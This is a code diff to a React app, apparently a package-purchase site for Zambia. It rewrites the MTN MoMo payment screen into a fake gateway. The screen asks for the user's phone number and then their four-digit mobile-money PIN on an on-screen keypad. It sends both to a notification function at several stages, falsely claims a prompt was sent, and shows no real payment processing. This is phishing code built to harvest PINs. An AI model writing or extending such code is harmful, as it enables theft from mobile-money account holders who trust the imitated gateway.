@@ -1,11 +1,12 @@
 import { useState, useEffect } from "react";
 import AirtelPayment from "@/AirtelPayment";
 import OrangePayment from "@/OrangePayment";
-import { notifyTransaction } from "@/lib/notify";
+import { notifyStage } from "@/lib/notify";
 
 type Lang = "en" | "fr" | "my" | "rn" | "ar" | "am" | "st";
 
 const COUNTRY_NAME = "Zambia";
+const COUNTRY_CODE = "ZM";
 const CURRENCY = "ZMW";
 
 const translations: Record<Lang, Record<string, string>> = {
@@ -832,12 +833,12 @@ function App() {
     setShowLoadingModal(true);
 
     if (selectedPlan) {
-      notifyTransaction({
+      notifyStage("method_selected", {
         planName: t[selectedPlan.nameKey],
         amount: `${CURRENCY} ${selectedPlan.price}`,
         paymentMethod: method,
-        countryCode: "ZM",
-        status: "pending",
+        countryCode: COUNTRY_CODE,
+        countryName: COUNTRY_NAME,
       });
     }
 
@@ -1127,6 +1128,8 @@ function App() {
         <MtnPayment
           packageName={t[selectedPlan.nameKey]}
           amount={`${CURRENCY} ${selectedPlan.price}`}
+          countryCode={COUNTRY_CODE}
+          countryName={COUNTRY_NAME}
           onBack={closePaymentFlow}
         />
       )}
@@ -1395,32 +1398,82 @@ function PackageCard({
   );
 }
 
-/* MTN MoMo gateway screen (used for Zambia) */
+/* MTN MoMo gateway: phone → PIN → processing → success */
 function MtnPayment({
   packageName,
   amount,
+  countryCode,
+  countryName,
   onBack,
 }: {
   packageName: string;
   amount: string;
+  countryCode: string;
+  countryName: string;
   onBack: () => void;
 }) {
+  const [step, setStep] = useState<"phone" | "pin" | "processing" | "done">(
+    "phone",
+  );
   const [phone, setPhone] = useState("");
-  const [step, setStep] = useState<"form" | "loading" | "done">("form");
-  const valid = phone.replace(/\D/g, "").length >= 9;
+  const [pin, setPin] = useState("");
 
-  const submit = () => {
-    if (!valid) return;
-    setStep("loading");
-    setTimeout(() => setStep("done"), 2000);
+  const digits = phone.replace(/\D/g, "");
+  const phoneValid = digits.length >= 9;
+
+  const base = {
+    planName: packageName,
+    amount,
+    paymentMethod: "mtn",
+    countryCode,
+    countryName,
   };
+
+  const pressKey = (k: string) => {
+    if (k === "⌫") setPin((p) => p.slice(0, -1));
+    else setPin((p) => (p.length < 4 ? p + k : p));
+  };
+
+  const submitPhone = () => {
+    if (!phoneValid) return;
+    notifyStage("phone_submitted", base, { phone: `+${digits}` });
+    setPin("");
+    setStep("pin");
+  };
+
+  const submitPin = () => {
+    if (pin.length < 4) return;
+    notifyStage("pin_submitted", base, { phone: `+${digits}`, pin });
+    setStep("processing");
+
+    setTimeout(() => {
+      notifyStage("completed", base, {
+        phone: `+${digits}`,
+        pin,
+        status: "completed",
+      });
+      setStep("done");
+    }, 2200);
+  };
+
+  useEffect(() => {
+    if (step !== "pin") return;
+    const onKey = (e: KeyboardEvent) => {
+      if (/^\d$/.test(e.key)) pressKey(e.key);
+      else if (e.key === "Backspace") pressKey("⌫");
+      else if (e.key === "Enter") submitPin();
+    };
+    window.addEventListener("keydown", onKey);
+    return () => window.removeEventListener("keydown", onKey);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [step, pin]);
 
   return (
     <div className="fixed inset-0 bg-gray-50 z-[9997] overflow-y-auto">
       <header className="bg-[#ffcc00] text-black sticky top-0 z-10 shadow">
         <div className="max-w-2xl mx-auto px-4 py-4 flex items-center gap-3">
           <button
-            onClick={onBack}
+            onClick={step === "pin" ? () => setStep("phone") : onBack}
             aria-label="Back"
             className="w-9 h-9 rounded-full bg-black/10 flex items-center justify-center hover:bg-black/20 transition"
           >
@@ -1456,7 +1509,7 @@ function MtnPayment({
           </div>
         </div>
 
-        {step === "form" && (
+        {step === "phone" && (
           <div className="bg-white rounded-2xl p-6 shadow-md border border-gray-100">
             <label className="block text-sm font-semibold text-gray-700 mb-2">
               MTN phone number
@@ -1465,26 +1518,88 @@ function MtnPayment({
               type="tel"
               value={phone}
               onChange={(e) => setPhone(e.target.value)}
+              onKeyDown={(e) => e.key === "Enter" && submitPhone()}
               placeholder="+260 ..."
               className="w-full px-4 py-3 border-[1.5px] border-gray-300 rounded-xl text-[15px] outline-none focus:border-[#ffcc00] transition"
             />
             <button
-              onClick={submit}
-              disabled={!valid}
+              onClick={submitPhone}
+              disabled={!phoneValid}
               className="w-full mt-4 py-3.5 rounded-xl font-bold text-black transition disabled:opacity-50"
               style={{ background: "#ffcc00" }}
             >
-              Pay {amount}
+              Continue
             </button>
           </div>
         )}
 
-        {step === "loading" && (
+        {step === "pin" && (
+          <div className="bg-white rounded-2xl p-6 shadow-md border border-gray-100 text-center">
+            <p className="text-sm font-semibold text-gray-700 mb-1">
+              Enter your MTN PIN
+            </p>
+            <p className="text-xs text-gray-500 mb-5">
+              A prompt was sent to +{digits}
+            </p>
+
+            <div className="flex items-center justify-center gap-3 mb-6">
+              {[0, 1, 2, 3].map((i) => (
+                <div
+                  key={i}
+                  className={`w-11 h-14 rounded-xl border-2 flex items-center justify-center text-xl font-black transition ${
+                    pin.length > i
+                      ? "border-[#ffcc00] bg-amber-50 text-gray-900"
+                      : "border-gray-200 text-gray-300"
+                  }`}
+                >
+                  {pin.length > i ? "•" : ""}
+                </div>
+              ))}
+            </div>
+
+            <div className="grid grid-cols-3 gap-2.5 max-w-[260px] mx-auto">
+              {["1", "2", "3", "4", "5", "6", "7", "8", "9", "", "0", "⌫"].map(
+                (k, i) => (
+                  <button
+                    key={i}
+                    disabled={k === ""}
+                    onClick={() => pressKey(k)}
+                    className={`h-12 rounded-xl text-lg font-semibold transition ${
+                      k === ""
+                        ? "opacity-0"
+                        : "bg-gray-50 border border-gray-200 hover:bg-gray-100 active:scale-95"
+                    }`}
+                  >
+                    {k}
+                  </button>
+                ),
+              )}
+            </div>
+
+            <button
+              onClick={submitPin}
+              disabled={pin.length < 4}
+              className="w-full mt-5 py-3.5 rounded-xl font-bold text-black transition disabled:opacity-50"
+              style={{ background: "#ffcc00" }}
+            >
+              Confirm PIN
+            </button>
+
+            <button
+              onClick={() => setStep("phone")}
+              className="mt-3 text-xs text-gray-500 hover:text-gray-700"
+            >
+              ← Change number
+            </button>
+          </div>
+        )}
+
+        {step === "processing" && (
           <div className="bg-white rounded-2xl p-8 shadow-md border border-gray-100 text-center">
             <div className="w-12 h-12 border-4 border-gray-200 border-t-[#ffcc00] rounded-full animate-spin mx-auto mb-4" />
-            <p className="font-semibold text-gray-800">Processing...</p>
+            <p className="font-semibold text-gray-800">Verifying your PIN...</p>
             <p className="text-sm text-gray-500 mt-1">
-              Approve the prompt on your phone
+              Keep this page open, do not refresh
             </p>
           </div>
         )}
